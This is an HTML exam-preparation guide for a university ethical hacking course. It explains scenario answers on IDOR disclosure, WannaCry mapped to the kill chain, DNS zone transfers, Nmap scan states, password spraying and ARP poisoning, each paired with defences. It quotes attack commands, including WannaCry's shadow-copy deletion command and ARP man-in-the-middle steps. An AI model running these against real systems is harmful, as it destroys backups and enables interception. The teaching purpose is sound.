@@ -1,0 +1,874 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Ethical Hacking - Master Case-Study & Scenario-Based Application Guide</title>
+<style>
+  @page {
+    size: A4 portrait;
+    margin: 12mm 12mm 12mm 12mm;
+    @bottom-right {
+      content: counter(page);
+    }
+  }
+
+  *, *:before, *:after {
+    box-sizing: border-box;
+  }
+
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+    font-size: 8.8pt;
+    line-height: 1.40;
+    color: #1e293b;
+    background-color: #ffffff;
+    margin: 0;
+    padding: 0;
+  }
+
+  .avoid-break {
+    page-break-inside: avoid;
+    break-inside: avoid;
+    margin-bottom: 12px;
+  }
+
+  .page-break {
+    page-break-before: always;
+  }
+
+  h1 {
+    font-size: 14pt;
+    font-weight: 800;
+    color: #0f172a;
+    border-bottom: 2px solid #dc2626;
+    padding-bottom: 4px;
+    margin-top: 10px;
+    margin-bottom: 6px;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+  }
+
+  h2 {
+    font-size: 11.5pt;
+    font-weight: 700;
+    color: #991b1b;
+    margin-top: 14px;
+    margin-bottom: 6px;
+    border-bottom: 1.5px solid #cbd5e1;
+    padding-bottom: 3px;
+  }
+
+  h3 {
+    font-size: 10pt;
+    font-weight: 700;
+    color: #b91c1c;
+    margin-top: 10px;
+    margin-bottom: 4px;
+    border-left: 3.5px solid #dc2626;
+    padding-left: 6px;
+  }
+
+  h4 {
+    font-size: 9pt;
+    font-weight: 700;
+    color: #475569;
+    margin-top: 6px;
+    margin-bottom: 3px;
+  }
+
+  p {
+    margin: 3px 0 5px 0;
+  }
+
+  blockquote {
+    border-left: 3.5px solid #dc2626;
+    background-color: #fef2f2;
+    padding: 6px 10px;
+    margin: 6px 0;
+    font-size: 8.5pt;
+    color: #991b1b;
+    border-radius: 0 4px 4px 0;
+  }
+
+  blockquote p {
+    margin: 2px 0;
+  }
+
+  pre {
+    background-color: #0f172a;
+    color: #f8fafc;
+    padding: 6px 8px;
+    border-radius: 4px;
+    font-family: "Cascadia Code", "Consolas", "Courier New", monospace;
+    font-size: 7.3pt;
+    line-height: 1.30;
+    overflow-x: auto;
+    margin: 5px 0;
+    page-break-inside: avoid;
+    break-inside: avoid;
+    border: 1px solid #334155;
+  }
+
+  code {
+    font-family: "Cascadia Code", "Consolas", "Courier New", monospace;
+    font-size: 8.0pt;
+    background-color: #f1f5f9;
+    color: #b91c1c;
+    padding: 1px 3px;
+    border-radius: 3px;
+    border: 1px solid #e2e8f0;
+  }
+
+  pre code {
+    background: none;
+    color: inherit;
+    padding: 0;
+    border: none;
+    font-size: inherit;
+  }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 5px 0;
+    font-size: 8.0pt;
+    page-break-inside: avoid;
+    break-inside: avoid;
+  }
+
+  th, td {
+    border: 1px solid #cbd5e1;
+    padding: 3px 5px;
+    text-align: left;
+    vertical-align: top;
+  }
+
+  th {
+    background-color: #f1f5f9;
+    font-weight: 700;
+    color: #0f172a;
+  }
+
+  tr:nth-child(even) td {
+    background-color: #f8fafc;
+  }
+
+  ul, ol {
+    margin: 3px 0 5px 16px;
+    padding: 0;
+  }
+
+  li {
+    margin-bottom: 2px;
+  }
+
+  hr {
+    border: 0;
+    border-top: 1px dashed #cbd5e1;
+    margin: 8px 0;
+  }
+</style>
+</head>
+<body>
+<h1>Ethical Hacking (CS3214 / MD***)</h1>
+<h1>Master Blueprint: Case-Study & Scenario-Based Application Guide</h1>
+<br>
+<blockquote><p>**Target Exam**: Friday, 27 November 2026 (11:00 AM - 1:00 PM)  </p></blockquote>
+<blockquote><p>**Course**: Ethical Hacking (CS3214 / MD***) | **Autonomous Syllabus**: AY 2026-27  </p></blockquote>
+<blockquote><p>**Official Faculty Clarification**: *"As this is a new subject, there are NO previous-year question papers. Questions will be mainly case-study/scenario-based, where you will have to explain the concept and apply it to a given example or situation. Focus on understanding concepts and their application."*  </p></blockquote>
+<blockquote><p>**Usage Strategy**: Master the 3-Tier Answering Framework and the 12 Core Scenario Templates below. In tomorrow's exam, whenever a scenario or situational question is asked, structure your response using this exact 3-step formula to earn maximum marks.</p></blockquote>
+<br>
+<hr>
+<br>
+<h2>Part 1: The 3-Tier Master Answering Framework for Scenario Questions</h2>
+<br>
+<p>Whenever the examiner presents a scenario (e.g. "An attacker intercepts traffic...", "A developer concatenates user input...", "A company detects unusual outbound traffic..."), structure your written answer into three distinct, labeled sections:</p>
+<br>
+<div class="avoid-break"><pre><code>+-----------------------------------------------------------------------------------+
+| TIER 1: VULNERABILITY &amp; CONCEPT IDENTIFICATION (25% Marks)                        |
+| - Name the exact technical vulnerability (e.g., Unsanitized Dynamic SQL Concatenation, |
+|   Stateless ARP Cache Poisoning RFC 826, 24-bit Cleartext IV Collision).          |
+| - Define the theoretical concept, standard protocol specifications, and CIA triad |
+|   impact (Confidentiality, Integrity, or Availability).                           |
++-----------------------------------------------------------------------------------+
+                                       |
+                                       v
++-----------------------------------------------------------------------------------+
+| TIER 2: STEP-BY-STEP SCENARIO EXECUTION &amp; TRACE (40% Marks)                       |
+| - Walk through the attack lifecycle or packet exchange step-by-step.              |
+| - Include exact commands, payloads, query outputs, or ASCII flow diagrams.        |
+| - Show the state before attack, the exploit trigger, and the resulting compromise.|
++-----------------------------------------------------------------------------------+
+                                       |
+                                       v
++-----------------------------------------------------------------------------------+
+| TIER 3: DEFENSE-IN-DEPTH REMEDIATION &amp; PREVENTIVE CONTROLS (35% Marks)            |
+| - Layer 1 (Application/Code Level): Parameterized queries, input validation, CSP.  |
+| - Layer 2 (Network/Infrastructure Level): Dynamic ARP Inspection, 802.1Q VLANs.   |
+| - Layer 3 (Policy/Administrative Level): Least privilege, patching lifecycle, MFA.|
++-----------------------------------------------------------------------------------+</code></pre></div>
+<br>
+<hr>
+<br>
+<h2>Part 2: Top 12 High-Yield Scenario & Case-Study Templates</h2>
+<br>
+<hr>
+<br>
+<div class="avoid-break"><h3>SCENARIO 1: Vulnerability Disclosure & Legal Repercussions (Unit 1)</h3>
+<br>
+<blockquote><p>**Exam Scenario**:  </p></blockquote>
+<blockquote><p>*"A security researcher discovers a critical vulnerability in an online banking portal that allows any authenticated user to view account balances of other customers by modifying the account ID in the URL (`/api/account?id=1042`). Without notifying the bank, the researcher publishes the complete vulnerability details, proof-of-concept script, and customer screenshots on Twitter/X to gain social media followers. Analyze this situation with respect to Vulnerability Disclosure models, Indian IT Act 2000 provisions, and professional ethical standards."*</p></blockquote>
+<br>
+<h4>Tier 1: Concept & Vulnerability Identification</h4>
+<p>1. <strong>Technical Flaw</strong>: <strong>Broken Object Level Authorization (BOLA)</strong> / Insecure Direct Object Reference (IDOR) - OWASP Top 10 API Security #1.</p>
+<p>2. <strong>Disclosure Type</strong>: <strong>Full Disclosure (Zero-Day Public Drop)</strong> without vendor coordination.</p>
+<p>3. <strong>Legal Context</strong>: Unsolicited access and public release of private financial data violates statutory cyber laws regardless of "good intentions".</p>
+<br>
+<h4>Tier 2: Scenario Analysis & Evaluation</h4>
+<p>* <strong>Responsible Disclosure vs Full Disclosure</strong>:</p>
+<p>  - <em>Responsible Disclosure (Coordinated Vulnerability Disclosure - CVD)</em>: The researcher privately contacts the bank security team, provides reproducible technical evidence, and grants a mutually agreed grace period (typically 30 to 90 days) for patch development before any public advisory.</p>
+<p>  - <em>Full Disclosure (Uncoordinated)</em>: Releasing unpatched flaw details exposes millions of innocent bank customers to immediate financial theft by malicious cybercriminals before the bank can remediate.</p>
+<p>* <strong>Indian Information Technology (IT) Act 2000 Penalties</strong>:</p>
+<p>  - <strong>Section 43</strong>: Penalty for unauthorized access, extraction, and downloading of database records (civil compensation up to Rs 1 Crore).</p>
+<p>  - <strong>Section 66</strong>: Computer-related offences - hacking with intent to cause wrongful loss/damage (imprisonment up to 3 years or fine up to Rs 5 Lakhs).</p>
+<p>  - <strong>Section 72</strong>: Breach of confidentiality and privacy without the consent of the concerned person.</p>
+<p>  - <strong>Digital Personal Data Protection (DPDP) Act 2023</strong>: Severe financial penalties for unauthorized exposure of personal financial identifiers.</p>
+<br>
+<h4>Tier 3: Proper Ethical Protocol & Remediation</h4>
+<p>1. <strong>Researcher Action (Safe Harbor)</strong>: Adhere to the organization's official Vulnerability Disclosure Policy (VDP) or accredited Bug Bounty platform (e.g. HackerOne, Bugcrowd). Use non-destructive test accounts only.</p>
+<p>2. <strong>Bank Remediation</strong>:</p>
+<p>   - Implement server-side authorization checks verifying that the logged-in session token (<code>session.userId</code>) strictly owns the requested resource ID (<code>account.ownerId</code>).</p>
+<p>   - Replace sequential database IDs (<code>id=1042</code>) with cryptographically secure, unguessable UUIDs (<code>id=a4f9b2c1-...</code>).</p>
+<br>
+<hr>
+<br>
+<div class="avoid-break"><h3>SCENARIO 2: Cyber Kill Chain Applied to Advanced Ransomware (Unit 1)</h3>
+<br>
+<blockquote><p>**Exam Scenario**:  </p></blockquote>
+<blockquote><p>*"A regional hospital network is paralyzed on a weekend morning. Critical patient monitoring systems, radiology databases, and emergency room terminals show red ransom notes demanding 300 USD in Bitcoin to decrypt files. Systems are encrypted and spreading automatically without any user interaction. Map this attack across the 7 stages of the Lockheed Martin Cyber Kill Chain, identify the underlying exploit mechanism (WannaCry), and formulate stage-by-stage defensive controls."*</p></blockquote>
+<br>
+<h4>Tier 1: Concept & Incident Identification</h4>
+<p>1. <strong>Attack Type</strong>: Autonomous Cryptoworm Ransomware (<strong>WannaCry / WanaCrypt0r 2.0</strong>).</p>
+<p>2. <strong>Exploit Vector</strong>: <strong>EternalBlue</strong> (NSA tool leaked by Shadow Brokers, targeting Microsoft vulnerability <code>MS17-010</code> in legacy SMBv1 protocol).</p>
+<p>3. <strong>Core Flaw</strong>: Buffer overflow and remote code execution in Server Message Block version 1 (SMBv1, port 445).</p>
+<br>
+<h4>Tier 2: Step-by-Step Cyber Kill Chain Mapping</h4>
+<br>
+<div class="avoid-break"><pre><code>[1. Recon] --------&gt; [2. Weaponization] ------&gt; [3. Delivery] --------&gt; [4. Exploitation]
+Scanned public       Packaged EternalBlue       Targeted open SMB       Overran SMBv1
+IPs for port 445     with DoublePulsar          port 445 over WAN       buffer; kernel
+listening            backdoor &amp; cryptor         and internal LAN        RCE achieved
+                                                                               |
+[7. Actions] &lt;------ [6. Command/Control] &lt;--- [5. Installation] &lt;-------------+
+Encrypted files with Kill-switch domain check;  Installed payload as
+RSA-2048/AES-128;    TOR client initialized     persistent Windows
+displayed UI ransom  for telemetry              service mssecsvc2.0</code></pre></div>
+<br>
+<p>* <strong>Stage 1 (Reconnaissance)</strong>: Attacker scanned wide IP ranges for public hosts with TCP port 445 (SMB) exposed.</p>
+<p>* <strong>Stage 2 (Weaponization)</strong>: Combined the <code>EternalBlue</code> kernel exploit with the <code>DoublePulsar</code> ring-0 payload injector and file-encrypting ransomware binary.</p>
+<p>* <strong>Stage 3 (Delivery)</strong>: Injected malicious SMB packets directly into exposed host ports; once inside one host, worm scanned local subnets (<code>/24</code>) to self-propagate.</p>
+<p>* <strong>Stage 4 (Exploitation)</strong>: Exploited mathematical buffer handling bug in SMBv1 transaction requests, gaining <code>NT AUTHORITY\SYSTEM</code> kernel execution.</p>
+<p>* <strong>Stage 5 (Installation)</strong>: Dropped <code>tasksche.exe</code> and created persistent Windows service <code>mssecsvc2.0</code>.</p>
+<p>* <strong>Stage 6 (Command & Control - C2)</strong>: Queried hardcoded kill-switch domain (<code>www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com</code>). If unregistered, execution continued; contacted TOR nodes for key management.</p>
+<p>* <strong>Stage 7 (Actions on Objectives)</strong>: Traversed all fixed and network drives, encrypted 170+ file extensions using AES-128 (keys encrypted with attacker RSA-2048 public key), deleted Volume Shadow Copies (<code>vssadmin delete shadows /all /quiet</code>), and displayed ransom desktop wallpaper.</p>
+<br>
+<h4>Tier 3: Stage-by-Stage Defensive Matrix</h4>
+<p>* <strong>At Stage 1 & 3 (Delivery)</strong>: Block TCP port 445 at edge firewalls; disable SMBv1 across all endpoints via PowerShell (<code>Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol</code>).</p>
+<p>* <strong>At Stage 4 (Exploitation)</strong>: Apply emergency security patch <code>MS17-010</code> issued by Microsoft.</p>
+<p>* <strong>At Stage 7 (Actions)</strong>: Maintain immutable, offline air-gapped backups (3-2-1 backup rule); configure endpoint protection / EDR to block unauthorized file encryption bursts.</p>
+<br>
+<hr>
+<br>
+<div class="avoid-break"><h3>SCENARIO 3: DNS Zone Transfer Leakage & OSINT Reconnaissance (Unit 2)</h3>
+<br>
+<blockquote><p>**Exam Scenario**:  </p></blockquote>
+<blockquote><p>*"During the initial reconnaissance phase of an authorized penetration test for an educational institute, the tester executes the following command from an external machine:  </p></blockquote>
+<blockquote><p>`dig @ns1.vitpune.ac.in vitpune.ac.in AXFR`  </p></blockquote>
+<blockquote><p>The query successfully dumps hundreds of records including `internal-erp.vitpune.ac.in 10.20.4.15`, `admin-db.vitpune.ac.in 192.168.100.5`, and `dev-portal.vitpune.ac.in`. Explain what occurred, analyze why this represents an active security failure, and provide the exact server configuration to fix it."*</p></blockquote>
+<br>
+<h4>Tier 1: Concept & Vulnerability Identification</h4>
+<p>1. <strong>Mechanism</strong>: <strong>Unrestricted DNS Zone Transfer (AXFR)</strong> under RFC 5936.</p>
+<p>2. <strong>Intended Purpose</strong>: Zone transfer is designed strictly for synchronizing the DNS database between Primary (Master) and Secondary (Slave) authoritative nameservers over TCP port 53.</p>
+<p>3. <strong>Flaw</strong>: Misconfigured nameserver permits AXFR requests from arbitrary, untrusted IP addresses worldwide without authentication.</p>
+<br>
+<h4>Tier 2: Scenario Analysis & Attacker Exploitation</h4>
+<br>
+<div class="avoid-break"><pre><code>[Tester / External Host]                         [Authoritative DNS Server (ns1)]
+           |                                                      |
+           | ----- 1. TCP SYN (Port 53) ------------------------&gt; |
+           | &lt;---- 2. TCP SYN-ACK ------------------------------- |
+           | ----- 3. TCP ACK ----------------------------------&gt; |
+           |                                                      |
+           | ----- 4. DNS Query: Type=AXFR (vitpune.ac.in) -----&gt; |
+           |                                                      |
+           | &lt;---- 5. Complete Zone Dump: ----------------------- |
+           |          SOA, NS, MX, A, AAAA, CNAME, TXT            |
+           |          - internal-erp.vitpune.ac.in (10.20.4.15)   |
+           |          - admin-db.vitpune.ac.in (192.168.100.5)    |
+           |          - dev-portal.vitpune.ac.in                  |</code></pre></div>
+<br>
+<p>* <strong>Consequences of Information Disclosure</strong>:</p>
+<p>  - Exposes the organization's entire internal network topology and naming schema.</p>
+<p>  - Leaks RFC 1918 private IP subnets (<code>10.20.4.0/24</code>, <code>192.168.100.0/24</code>), revealing internal addressing architecture.</p>
+<p>  - Exposes staging, development, and administrative systems (<code>dev-portal</code>, <code>admin-db</code>) that are typically less fortified than the primary corporate homepage.</p>
+<p>  - Allows an adversary to bypass external load balancers and target internal hosts directly if perimeter ingress filtering is deficient.</p>
+<br>
+<h4>Tier 3: Prevention & Hardening Instructions</h4>
+<p>1. <strong>BIND Nameserver (<code>named.conf</code>) Hardening</strong>:</p>
+<p>   Restrain zone transfers strictly to known secondary server IP addresses or TSIG keys:</p>
+<p>   <code></code>`text</p>
+<p>   // Inside /etc/bind/named.conf.options or zone declaration</p>
+<p>   zone "vitpune.ac.in" {</p>
+<p>       type master;</p>
+<p>       file "/etc/bind/zones/db.vitpune.ac.in";</p>
+<p>       allow-transfer { </p>
+<p>           198.51.100.2; // Authorized secondary nameserver IP ONLY</p>
+<p>       };</p>
+<p>   };</p>
+<p>   <code></code>`</p>
+<p>   To disable zone transfers entirely for public queries: <code>allow-transfer { none; };</code>.</p>
+<p>2. <strong>Access Control Lists (ACL)</strong>: Use Transaction Signatures (TSIG) shared secret keys for authenticated zone replication between primary and secondary servers.</p>
+<br>
+<hr>
+<br>
+<div class="avoid-break"><h3>SCENARIO 4: Nmap Port Scanning Mechanics & Firewall Interaction (Unit 2)</h3>
+<br>
+<blockquote><p>**Exam Scenario**:  </p></blockquote>
+<blockquote><p>*"A security analyst scans an enterprise web server `203.0.113.50` using Nmap.  </p></blockquote>
+<blockquote><p>1. Running `nmap -sS -p 80,443,22 203.0.113.50` reports Port 80 as 'open', Port 443 as 'filtered', and Port 22 as 'closed'.  </p></blockquote>
+<blockquote><p>2. Explain the exact TCP packet exchange that caused Nmap to classify each port into these three distinct states.  </p></blockquote>
+<blockquote><p>3. Why would an analyst choose a SYN Stealth Scan (`-sS`) over a TCP Connect Scan (`-sT`)?"*</p></blockquote>
+<br>
+<h4>Tier 1: Core Scanning Mechanics & Concepts</h4>
+<p>* <strong>Nmap Port States</strong>:</p>
+<p>  - <code>Open</code>: A service/daemon is actively listening and accepted the connection.</p>
+<p>  - <code>Closed</code>: Host is reachable, but no application is listening on that port.</p>
+<p>  - <code>Filtered</code>: Nmap cannot determine if the port is open because packet filtering (firewall, ACL) drops or intercepts probes.</p>
+<br>
+<h4>Tier 2: Packet Exchange Trace for Each Port</h4>
+<br>
+<div class="avoid-break"><pre><code>1. PORT 80 [OPEN] (TCP SYN Stealth Probe):
+   Scanner  --- TCP SYN (Seq=X, Dport=80) -------------------&gt; Target
+   Scanner  &lt;-- TCP SYN-ACK (Seq=Y, Ack=X+1, Sport=80) ------- Target
+   Scanner  --- TCP RST (Seq=X+1, Dport=80) -----------------&gt; Target
+   (Result: Port marked OPEN. RST immediately tears down connection before app logs it)
+
+2. PORT 443 [FILTERED] (Firewall Rule Dropped Packet):
+   Scanner  --- TCP SYN (Seq=X, Dport=443) ------------------&gt; Target/Firewall
+   [Firewall silently DROPS the packet; or returns ICMP Type 3 Code 13 Administratively Prohibited]
+   Scanner  --- (Wait Timeout expired, retransmitted 2x, no response)
+   (Result: Port marked FILTERED due to lack of response)
+
+3. PORT 22 [CLOSED] (Kernel Rejection):
+   Scanner  --- TCP SYN (Seq=X, Dport=22) -------------------&gt; Target
+   Scanner  &lt;-- TCP RST-ACK (Seq=0, Ack=X+1, Sport=22) ------- Target
+   (Result: Port marked CLOSED. Target OS kernel indicates no service listening)</code></pre></div>
+<br>
+<h4>Tier 3: Analytical Comparison (`-sS` vs `-sT`)</h4>
+<br>
+<div class="avoid-break"><table>
+<thead><tr><th>Feature</th><th>TCP Connect Scan (`-sT`)</th><th>TCP SYN Stealth Scan (`-sS`)</th></tr></thead>
+<tbody>
+<tr><td>**System Call**</td><td>Standard OS `connect()` API call</td><td>Raw socket construction (`SOCK_RAW`)</td></tr>
+<tr><td>**Handshake**</td><td>Completes full 3-way handshake (`SYN` -> `SYN-ACK` -> `ACK`)</td><td>Half-open (`SYN` -> `SYN-ACK` -> `RST`)</td></tr>
+<tr><td>**Application Logging**</td><td>Logged as completed connection by web/mail servers</td><td>Not logged by most application-layer software</td></tr>
+<tr><td>**Privileges Needed**</td><td>Standard non-privileged user</td><td>Requires Administrator / `root` privileges</td></tr>
+<tr><td>**Network Overhead**</td><td>Higher (3 packets per open port + teardown)</td><td>Lower (2 packets per port)</td></tr>
+</tbody></table></div>
+<br>
+<hr>
+<br>
+<div class="avoid-break"><h3>SCENARIO 5: Password Spraying, Credential Stuffing & Rainbow Tables (Unit 3)</h3>
+<br>
+<blockquote><p>**Exam Scenario**:  </p></blockquote>
+<blockquote><p>*"A multinational firm implements an Active Directory policy: 'Any user account with 5 consecutive incorrect password attempts will be locked for 30 minutes.' Despite this policy, an adversary compromises 35 corporate accounts over a single weekend without triggering any account lockouts.  </p></blockquote>
+<blockquote><p>1. Identify and explain the exact password attack technique used.  </p></blockquote>
+<blockquote><p>2. Contrast this technique with Credential Stuffing and Dictionary Attacks.  </p></blockquote>
+<blockquote><p>3. Why are precomputed Rainbow Tables ineffective against modern salted password hashes?"*</p></blockquote>
+<br>
+<h4>Tier 1: Concept & Attack Classification</h4>
+<p>1. <strong>Technique Used</strong>: <strong>Password Spraying (Horizontal Brute-Force)</strong>.</p>
+<p>2. <strong>Root Cause</strong>: The organization's lockout rule was configured <strong>per-username</strong>, not globally across the authentication endpoint.</p>
+<p>3. <strong>Defense Failure</strong>: Traditional account lockout policies assume a vertical attack (guessing thousands of passwords against one single user).</p>
+<br>
+<h4>Tier 2: Technical Mechanics Breakdown</h4>
+<p>* <strong>Password Spraying Mechanics</strong>:</p>
+<p>  - The attacker collects 5,000 valid corporate usernames (via LinkedIn OSINT, email enumeration, or <code>name@company.com</code> format).</p>
+<p>  - The attacker tests <strong>one single common password</strong> (e.g. <code>Winter2026!</code>, <code>Company@123</code>) across all 5,000 accounts.</p>
+<p>  - Each account receives exactly <strong>1 failed attempt</strong> (well below the 5-attempt threshold).</p>
+<p>  - The attacker waits 35 minutes (past the lockout reset window), then sprays a second password (e.g. <code>Welcome@2026</code>).</p>
+<p>  - Statistically, out of 5,000 employees, 0.5% to 1% use seasonal passwords -> 25 to 50 accounts compromised with zero lockouts.</p>
+<br>
+<p>* <strong>Comparison: Password Attack Typology</strong>:</p>
+<p>  - <em>Dictionary Attack (Vertical)</em>: Attacker tries 10,000 passwords against 1 target account (<code>admin</code>). Triggers lockout in 5 attempts.</p>
+<p>  - <em>Password Spraying (Horizontal)</em>: Attacker tries 1 password against 10,000 target accounts. Bypasses per-user lockout entirely.</p>
+<p>  - <em>Credential Stuffing (Replay)</em>: Attacker takes a database dump of leaked username/password pairs from an external breach (e.g. LinkedIn breach) and automatically replays them on corporate banking/VPN endpoints, exploiting password reuse.</p>
+<br>
+<p>* <strong>Why Rainbow Tables Fail Against Salting</strong>:</p>
+<p>  - A Rainbow Table is a precomputed lookup table mapping plaintext passwords to their hashes using reduction functions:</p>
+<p>    $$P \longrightarrow \text{Hash}(P) \longrightarrow R_1(\text{Hash}) \longrightarrow P_1 \longrightarrow \dots \longrightarrow \text{Final Hash}$$</p>
+<p>  - <strong>Cryptographic Salt</strong>: A unique, cryptographically random bit string $S$ (minimum 16 bytes) generated per user and concatenated before hashing:</p>
+<p>    $$\text{Stored Record} = \big( \text{Username}, S, \text{Hash}(S \mathbin{\Vert} P) \big)$$</p>
+<p>  - <strong>Mathematical Proof of Neutralization</strong>: If a rainbow table has 10^8 precomputed passwords, a 32-bit salt multiplies the required search space by 2^32 approx 4.3 x 10^9. The attacker would have to regenerate an entire multi-terabyte rainbow table <strong>for every individual user's salt</strong>, making precomputation computationally infeasible.</p>
+<br>
+<h4>Tier 3: Comprehensive Defense Strategy</h4>
+<p>1. <strong>Smart Rate Limiting</strong>: Implement IP-based, tenant-based, and heuristic rate limiting (e.g., alert if 50 distinct usernames fail from one IP/subnet within 10 minutes).</p>
+<p>2. <strong>Slow Hashing Algorithms</strong>: Use memory-hard key derivation functions: <strong>Argon2id</strong> (winner of Password Hashing Competition) or <strong>bcrypt</strong> with work factor >= 12.</p>
+<p>3. <strong>MFA with Number Matching</strong>: Enforce FIDO2 WebAuthn security keys or authenticator push notifications with number matching (defeating MFA fatigue).</p>
+<br>
+<hr>
+<br>
+<div class="avoid-break"><h3>SCENARIO 6: ARP Spoofing / Poisoning & Man-in-the-Middle (Unit 3)</h3>
+<br>
+<blockquote><p>**Exam Scenario**:  </p></blockquote>
+<blockquote><p>*"In an internal office LAN, Host A (`192.168.1.10`, MAC `AA:AA:AA:AA:AA:AA`) communicates with Default Gateway G (`192.168.1.1`, MAC `GG:GG:GG:GG:GG:GG`). Host C (`192.168.1.50`, MAC `CC:CC:CC:CC:CC:CC`) connects to the same unmanaged switch and wants to intercept Host A's unencrypted web sessions.  </p></blockquote>
+<blockquote><p>1. Diagram and explain the step-by-step ARP cache poisoning attack executed by Host C.  </p></blockquote>
+<blockquote><p>2. Explain the fundamental protocol design flaw in RFC 826 ARP that enables this.  </p></blockquote>
+<blockquote><p>3. Provide the enterprise Layer 2 switch mechanisms required to prevent this attack."*</p></blockquote>
+<br>
+<h4>Tier 1: Concept & Protocol Design Flaw</h4>
+<p>1. <strong>Vulnerability</strong>: <strong>ARP Cache Poisoning / ARP Spoofing (RFC 826 Flaw)</strong>.</p>
+<p>2. <strong>Underlying Design Flaw</strong>:</p>
+<p>   - ARP is <strong>stateless and unauthenticated</strong>.</p>
+<p>   - Network hosts accept <strong>gratuitous / unsolicited ARP replies</strong> even if they never transmitted an ARP request.</p>
+<p>   - When an ARP packet arrives, the host blindly overwrites its existing dynamic ARP cache with the incoming <code>(IP, MAC)</code> pair without cryptographic verification.</p>
+<br>
+<h4>Tier 2: Attack Flow Diagram & Packet Walkthrough</h4>
+<br>
+<div class="avoid-break"><pre><code>[Host A: 192.168.1.10]          [Switch]          [Gateway G: 192.168.1.1]
+   MAC: AA:AA:AA:AA:AA:AA                             MAC: GG:GG:GG:GG:GG:GG
+         |                                                      |
+         |                    [Attacker C: 192.168.1.50]        |
+         |                       MAC: CC:CC:CC:CC:CC:CC         |
+         |                                  |                   |
+         |                                  |                   |
+         | &lt;--- Unsolicited ARP Reply: -----+                   |
+         |      "192.168.1.1 is at CC:CC"   |                   |
+         |      (Poisons Host A Cache)      |                   |
+         |                                  +---- Unsolicited ARP Reply: ----&gt; |
+         |                                        "192.168.1.10 is at CC:CC"   |
+         |                                        (Poisons Gateway G Cache)    |
+         |                                                                     |
+         | ==== Data Frame: DstIP=192.168.1.1, DstMAC=CC:CC:CC:CC:CC:CC =====&gt; |
+         |      (Host A sends traffic intended for Gateway straight to Attacker)|
+         |                                  |                                  |
+         |                                  +==== Attacker Inspects/Modifies =&gt;|
+         |                                        Forwards to Gateway G        |</code></pre></div>
+<br>
+<p>* <strong>Step 1 (Poisoning Host A)</strong>: Attacker C transmits continuous unsolicited ARP reply packets to Host A claiming: <code>Sender IP: 192.168.1.1</code>, <code>Sender MAC: CC:CC:CC:CC:CC:CC</code>. Host A updates its cache: <code>192.168.1.1</code> -> <code>CC:CC:CC:CC:CC:CC</code>.</p>
+<p>* <strong>Step 2 (Poisoning Gateway G)</strong>: Attacker C sends unsolicited ARP reply packets to Gateway G claiming: <code>Sender IP: 192.168.1.10</code>, <code>Sender MAC: CC:CC:CC:CC:CC:CC</code>. Gateway updates its cache: <code>192.168.1.10</code> -> <code>CC:CC:CC:CC:CC:CC</code>.</p>
+<p>* <strong>Step 3 (Traffic Interception & Forwarding)</strong>: Host A transmits IP packets to the gateway with Layer 2 destination MAC <code>CC:CC:CC:CC:CC:CC</code>. The switch forwards the frame to Attacker C. Attacker C enables IP forwarding (<code>sysctl -w net.ipv4.ip_forward=1</code>), inspects/modifies payloads with Wireshark/Ettercap, and forwards them to Gateway G. Bidirectional MITM is established.</p>
+<br>
+<h4>Tier 3: Enterprise Layer 2 Switch Defenses</h4>
+<p>1. <strong>Dynamic ARP Inspection (DAI)</strong>:</p>
+<p>   - Configured on managed Layer 2 switches.</p>
+<p>   - Switch intercepts all ARP packets on untrusted access ports.</p>
+<p>   - Cross-references incoming ARP <code>(Sender IP, Sender MAC)</code> against the trusted <strong>DHCP Snooping Binding Database</strong>.</p>
+<p>   - If the mapping does not match a valid DHCP lease or static entry, the switch drops the forged ARP packet immediately and logs an alert.</p>
+<p>2. <strong>Static ARP Tables</strong>: For small, critical links (e.g. server-to-default-gateway), hardcode static permanent ARP mappings (<code>arp -s 192.168.1.1 GG-GG-GG-GG-GG-GG</code>).</p>
+<p>3. <strong>Port Security & Private VLANs (PVLAN)</strong>: Restrict port to authorized MACs and isolate client workstations from talking to each other directly on Layer 2.</p>
+<br>
+<hr>
+<br>
+<div class="avoid-break"><h3>SCENARIO 7: Enterprise Network Defense & DMZ Architecture (Unit 3)</h3>
+<br>
+<blockquote><p>**Exam Scenario**:  </p></blockquote>
+<blockquote><p>*"A corporate enterprise hosts an e-commerce website, public DNS, and email services, while maintaining internal proprietary product design databases and employee finance records. Design a secure enterprise network architecture.  </p></blockquote>
+<blockquote><p>1. Draw a labeled network diagram incorporating a Perimeter Router, External Firewall, DMZ, Internal Firewall, Trusted LAN, and IDS/IPS.  </p></blockquote>
+<blockquote><p>2. Explain why a Dual-Firewall DMZ topology is superior to a Single-Firewall topology.  </p></blockquote>
+<blockquote><p>3. Differentiate where an IDS versus an IPS should be deployed."*</p></blockquote>
+<br>
+<h4>Tier 1: Concept & Architectural Principles</h4>
+<p>1. <strong>Core Concept</strong>: <strong>Demilitarized Zone (DMZ)</strong> & <strong>Defense-in-Depth</strong>.</p>
+<p>2. <strong>Principle</strong>: Untrusted public traffic from the Internet must NEVER be allowed direct access to internal corporate databases. Public-facing servers are isolated in a semi-trusted neutral buffer zone (DMZ).</p>
+<br>
+<h4>Tier 2: Dual-Firewall DMZ Network Blueprint</h4>
+<br>
+<div class="avoid-break"><pre><code>                          [ UNTRUSTED INTERNET ]
+                                     |
+                                     v
+                          [ Perimeter Border Router ]
+                                     |
+                                     v
+                        [ External Firewall (FW 1) ]
+                        (Vendor A - Stateful / NGFW)
+                                     |
+             +-----------------------+-----------------------+
+             |                                               |
+             v                                               v
+     [ DMZ Network (172.16.1.0/24) ]                 [ Inline IPS ]
+     - Public Web Server (HTTP/HTTPS: 80, 443)       (Inspects DMZ traffic)
+     - Authoritative DNS Server (UDP/TCP: 53)
+     - Mail Gateway / SMTP Server (TCP: 25)
+             |
+             +-----------------------+
+                                     |
+                                     v
+                        [ Internal Firewall (FW 2) ]
+                        (Vendor B - Strict Filtering)
+                                     |
+             +-----------------------+-----------------------+
+             |                                               |
+             v                                               v
+   [ Out-of-Band IDS ]                           [ Trusted Corporate LAN ]
+   (Monitors SPAN/Mirror                         (10.0.0.0/16 Private)
+    port on Core Switch)                         - Internal Database Server
+                                                 - Active Directory (DC)
+                                                 - Employee Workstations</code></pre></div>
+<br>
+<h4>Tier 3: Critical Design Justifications</h4>
